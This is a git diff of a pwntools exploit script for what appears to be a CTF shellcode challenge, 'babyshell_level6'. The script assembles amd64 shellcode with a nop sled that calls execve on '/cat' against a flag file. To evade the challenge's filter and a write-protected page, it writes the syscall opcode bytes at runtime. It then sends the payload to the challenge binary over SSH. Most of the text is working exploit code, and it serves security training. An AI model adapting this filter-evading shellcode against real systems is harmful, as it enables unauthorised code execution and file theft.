@@ -3,6 +3,7 @@ from pwn import *
 import re
 
 context.arch = 'amd64'
+context.timeout = 3000000
 
 # 1 Stackframe is 8 bytes (64bit)
 
@@ -10,9 +11,10 @@ context.arch = 'amd64'
 # puts("Removing write permissions from first 4096 bytes of shellcode.\n");
 #    assert(mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC) == 0);
 
-shellcode="nop \n"*4000
-shellcode+=f"""
-syscall:
+shellcode=f"""
+.rept 4096
+  nop
+.endr
 nop
 nop
 push {u32(b"/cat")}                        /* Push "tac/" onto the stack (32bit/4byte) */
@@ -33,34 +35,32 @@ push 0                                     /* push null byte onto stack */
 pop rdx                                    /* pop it into rdx */
 push 0x3b                                  /* push execve onto stack */                                 
 pop rax                                    /* pop it into rax */
-mov ecx, 0x26930fa0                        /* move address of syscall label to ecx */
+mov ecx, 0x026930ffe                        /* move address of syscall label to ecx */
 mov word ptr [ecx], 0x0f                   /* move second part of opcode of syscall to the address ecx points to */
 mov word ptr [ecx + 1], 0x05               /* move first part of opcode of syscall to the address ecx points to */
-jmp syscall                                /* jump to address where opcode got posted to */
+jmp rcx
 """
 # both not working, how to prevent 48 opcode in 64 bit mode? 
 #shellcode=pwnlib.shellcraft.i386.linux.cat("/flag")
 #shellcode=pwnlib.shellcraft.amd64.linux.sh()
-shellcode=(asm(shellcode))
 print(shellcode)
+shellcode=(asm(shellcode))
+#print(shellcode)
 
 
 print('1', disasm(shellcode))
 #ELF.from_bytes(shellcode).debug().interactive()
-
-
-def btos(n):
-    return n.decode('UTF-8')
     
 s = ssh(host="pwn")
 f = SSHPath('/tmp/my_script.py', ssh=s)
 f.touch()
 f.write_text('import subprocess; subprocess.run("/challenge/babyshell_level6")')
-p = s.process(['python', '/tmp/my_script.py'])
-r = p.recvuntil(b"Reading 0x2000 bytes from stdin.")
-print(r.decode())
+p = s.process(['/challenge/babyshell_level6'])
+#r = p.recvuntil(b"Reading 0x2000 bytes from stdin.")
+#print(r.decode())
 
 
 shellcode=bytes(shellcode)
+print("length", len(shellcode))
 p.send(shellcode)
 print(p.recvall().decode("UTF-8"))
